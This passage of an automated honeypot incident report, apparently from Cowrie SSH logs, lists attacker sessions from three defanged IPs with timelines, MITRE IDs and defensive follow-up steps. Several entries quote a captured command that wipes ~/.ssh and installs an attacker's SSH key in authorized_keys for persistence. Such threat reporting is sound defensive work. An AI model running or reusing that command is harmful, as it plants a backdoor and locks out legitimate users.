| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:55:33` | `cowrie.session.connect` |
| `2026-06-10 05:55:33` | `cowrie.client.version` |
| `2026-06-10 05:55:33` | `cowrie.client.kex` |
| `2026-06-10 05:55:34` | `cowrie.login.success` |
| `2026-06-10 05:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b4de5c564c

| Field | Detail |
|---|---|
| **Source IP** | `182.44.116[.]87` |
| **First Seen** | 2026-06-10 05:56 |
| **Last Seen** | 2026-06-10 05:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:56:02` | `cowrie.session.connect` |
| `2026-06-10 05:56:02` | `cowrie.client.version` |
| `2026-06-10 05:56:02` | `cowrie.client.kex` |
| `2026-06-10 05:56:03` | `cowrie.login.success` |
| `2026-06-10 05:56:03` | `cowrie.session.params` |
| `2026-06-10 05:56:03` | `cowrie.command.input` |
| `2026-06-10 05:56:03` | `cowrie.command.failed` |
| `2026-06-10 05:56:03` | `cowrie.log.closed` |
| `2026-06-10 05:56:03` | `cowrie.session.params` |
| `2026-06-10 05:56:03` | `cowrie.command.input` |
| `2026-06-10 05:56:03` | `cowrie.session.file_download` |
| `2026-06-10 05:56:03` | `cowrie.log.closed` |
| `2026-06-10 05:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `182.44.116[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6131f892f99

| Field | Detail |
|---|---|
| **Source IP** | `182.44.116[.]87` |
| **First Seen** | 2026-06-10 05:56 |
| **Last Seen** | 2026-06-10 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:56:05` | `cowrie.session.connect` |
| `2026-06-10 05:56:05` | `cowrie.client.version` |
| `2026-06-10 05:56:06` | `cowrie.client.kex` |
| `2026-06-10 05:56:06` | `cowrie.login.success` |
| `2026-06-10 05:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `182.44.116[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33f99ba93a38

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 05:56 |
| **Last Seen** | 2026-06-10 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:56:21` | `cowrie.session.connect` |
| `2026-06-10 05:56:21` | `cowrie.client.version` |
| `2026-06-10 05:56:21` | `cowrie.client.kex` |
| `2026-06-10 05:56:21` | `cowrie.login.success` |
| `2026-06-10 05:56:22` | `cowrie.session.params` |
| `2026-06-10 05:56:22` | `cowrie.command.input` |
| `2026-06-10 05:56:22` | `cowrie.command.failed` |
| `2026-06-10 05:56:22` | `cowrie.log.closed` |
| `2026-06-10 05:56:22` | `cowrie.session.params` |
| `2026-06-10 05:56:22` | `cowrie.command.input` |
| `2026-06-10 05:56:22` | `cowrie.session.file_download` |
| `2026-06-10 05:56:22` | `cowrie.log.closed` |
| `2026-06-10 05:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1daea35b44f

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 05:56 |
| **Last Seen** | 2026-06-10 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:56:24` | `cowrie.session.connect` |
| `2026-06-10 05:56:24` | `cowrie.client.version` |
| `2026-06-10 05:56:24` | `cowrie.client.kex` |
| `2026-06-10 05:56:24` | `cowrie.login.success` |
| `2026-06-10 05:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bc2ef10a3ff

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:00 |
| **Last Seen** | 2026-06-10 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:00:21` | `cowrie.session.connect` |
| `2026-06-10 06:00:21` | `cowrie.client.version` |
| `2026-06-10 06:00:21` | `cowrie.client.kex` |
| `2026-06-10 06:00:21` | `cowrie.login.success` |
| `2026-06-10 06:00:21` | `cowrie.session.params` |
| `2026-06-10 06:00:21` | `cowrie.command.input` |
| `2026-06-10 06:00:21` | `cowrie.command.failed` |
| `2026-06-10 06:00:22` | `cowrie.log.closed` |
| `2026-06-10 06:00:22` | `cowrie.session.params` |
| `2026-06-10 06:00:22` | `cowrie.command.input` |
| `2026-06-10 06:00:22` | `cowrie.session.file_download` |
| `2026-06-10 06:00:22` | `cowrie.log.closed` |
| `2026-06-10 06:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09c9212f5cc7

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:00 |
| **Last Seen** | 2026-06-10 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:00:23` | `cowrie.session.connect` |
| `2026-06-10 06:00:23` | `cowrie.client.version` |
| `2026-06-10 06:00:23` | `cowrie.client.kex` |
| `2026-06-10 06:00:24` | `cowrie.login.success` |
| `2026-06-10 06:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9802b1455869

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:04 |
| **Last Seen** | 2026-06-10 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:04:01` | `cowrie.session.connect` |
| `2026-06-10 06:04:01` | `cowrie.client.version` |
| `2026-06-10 06:04:01` | `cowrie.client.kex` |
| `2026-06-10 06:04:01` | `cowrie.login.success` |
| `2026-06-10 06:04:01` | `cowrie.session.params` |
| `2026-06-10 06:04:01` | `cowrie.command.input` |
| `2026-06-10 06:04:01` | `cowrie.command.failed` |
| `2026-06-10 06:04:02` | `cowrie.log.closed` |
| `2026-06-10 06:04:02` | `cowrie.session.params` |
| `2026-06-10 06:04:02` | `cowrie.command.input` |
| `2026-06-10 06:04:02` | `cowrie.session.file_download` |
| `2026-06-10 06:04:02` | `cowrie.log.closed` |
| `2026-06-10 06:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0b2c5dba7d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:04 |
| **Last Seen** | 2026-06-10 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:04:03` | `cowrie.session.connect` |
| `2026-06-10 06:04:03` | `cowrie.client.version` |
| `2026-06-10 06:04:03` | `cowrie.client.kex` |
| `2026-06-10 06:04:04` | `cowrie.login.success` |
| `2026-06-10 06:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e3d9e3deed

| Field | Detail |
|---|---|
| **Source IP** | `182.44.116[.]87` |
| **First Seen** | 2026-06-10 06:05 |
| **Last Seen** | 2026-06-10 06:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:05:33` | `cowrie.session.connect` |
| `2026-06-10 06:05:33` | `cowrie.client.version` |
| `2026-06-10 06:05:33` | `cowrie.client.kex` |
| `2026-06-10 06:05:33` | `cowrie.login.success` |
| `2026-06-10 06:05:33` | `cowrie.session.params` |
| `2026-06-10 06:05:33` | `cowrie.command.input` |
| `2026-06-10 06:05:33` | `cowrie.command.failed` |
| `2026-06-10 06:05:34` | `cowrie.log.closed` |
| `2026-06-10 06:05:34` | `cowrie.session.params` |
| `2026-06-10 06:05:34` | `cowrie.command.input` |
| `2026-06-10 06:05:34` | `cowrie.session.file_download` |
| `2026-06-10 06:05:34` | `cowrie.log.closed` |
| `2026-06-10 06:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `182.44.116[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a7c2c2c8e5

| Field | Detail |
|---|---|
| **Source IP** | `182.44.116[.]87` |
| **First Seen** | 2026-06-10 06:05 |
| **Last Seen** | 2026-06-10 06:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:05:36` | `cowrie.session.connect` |
| `2026-06-10 06:05:36` | `cowrie.client.version` |
| `2026-06-10 06:05:36` | `cowrie.client.kex` |
| `2026-06-10 06:05:37` | `cowrie.login.success` |
| `2026-06-10 06:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `182.44.116[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c5d218424d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:06 |
| **Last Seen** | 2026-06-10 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:06:01` | `cowrie.session.connect` |
| `2026-06-10 06:06:01` | `cowrie.client.version` |
| `2026-06-10 06:06:01` | `cowrie.client.kex` |
| `2026-06-10 06:06:01` | `cowrie.login.success` |
| `2026-06-10 06:06:02` | `cowrie.session.params` |
| `2026-06-10 06:06:02` | `cowrie.command.input` |
| `2026-06-10 06:06:02` | `cowrie.command.failed` |
| `2026-06-10 06:06:02` | `cowrie.log.closed` |
| `2026-06-10 06:06:02` | `cowrie.session.params` |
| `2026-06-10 06:06:02` | `cowrie.command.input` |
| `2026-06-10 06:06:02` | `cowrie.session.file_download` |
| `2026-06-10 06:06:02` | `cowrie.log.closed` |
| `2026-06-10 06:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1e77740189

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:06 |
| **Last Seen** | 2026-06-10 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:06:04` | `cowrie.session.connect` |
| `2026-06-10 06:06:04` | `cowrie.client.version` |
| `2026-06-10 06:06:04` | `cowrie.client.kex` |
| `2026-06-10 06:06:04` | `cowrie.login.success` |
| `2026-06-10 06:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703b58713fde

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:06 |
| **Last Seen** | 2026-06-10 06:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:06:47` | `cowrie.session.connect` |
| `2026-06-10 06:06:47` | `cowrie.client.version` |
| `2026-06-10 06:06:48` | `cowrie.client.kex` |
| `2026-06-10 06:06:48` | `cowrie.login.success` |
| `2026-06-10 06:06:48` | `cowrie.session.params` |
| `2026-06-10 06:06:48` | `cowrie.command.input` |
| `2026-06-10 06:06:48` | `cowrie.command.failed` |
| `2026-06-10 06:06:49` | `cowrie.log.closed` |
| `2026-06-10 06:06:49` | `cowrie.session.params` |
| `2026-06-10 06:06:49` | `cowrie.command.input` |
| `2026-06-10 06:06:49` | `cowrie.session.file_download` |
| `2026-06-10 06:06:49` | `cowrie.log.closed` |
| `2026-06-10 06:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95af2b38b2c

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:06 |
| **Last Seen** | 2026-06-10 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:06:51` | `cowrie.session.connect` |
| `2026-06-10 06:06:51` | `cowrie.client.version` |
| `2026-06-10 06:06:52` | `cowrie.client.kex` |
| `2026-06-10 06:06:52` | `cowrie.login.success` |
| `2026-06-10 06:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8dbd8e888d

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:13 |
| **Last Seen** | 2026-06-10 06:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:13:27` | `cowrie.session.connect` |
| `2026-06-10 06:13:27` | `cowrie.client.version` |
| `2026-06-10 06:13:27` | `cowrie.client.kex` |
| `2026-06-10 06:13:28` | `cowrie.login.success` |
| `2026-06-10 06:13:28` | `cowrie.session.params` |
| `2026-06-10 06:13:28` | `cowrie.command.input` |
| `2026-06-10 06:13:28` | `cowrie.command.failed` |
| `2026-06-10 06:13:28` | `cowrie.log.closed` |
| `2026-06-10 06:13:29` | `cowrie.session.params` |
| `2026-06-10 06:13:29` | `cowrie.command.input` |
| `2026-06-10 06:13:29` | `cowrie.session.file_download` |
| `2026-06-10 06:13:29` | `cowrie.log.closed` |
| `2026-06-10 06:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54830891ba78

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:13 |
| **Last Seen** | 2026-06-10 06:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:13:31` | `cowrie.session.connect` |
| `2026-06-10 06:13:31` | `cowrie.client.version` |
| `2026-06-10 06:13:31` | `cowrie.client.kex` |
| `2026-06-10 06:13:32` | `cowrie.login.success` |
| `2026-06-10 06:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0dd08c83b36

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:13 |
| **Last Seen** | 2026-06-10 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
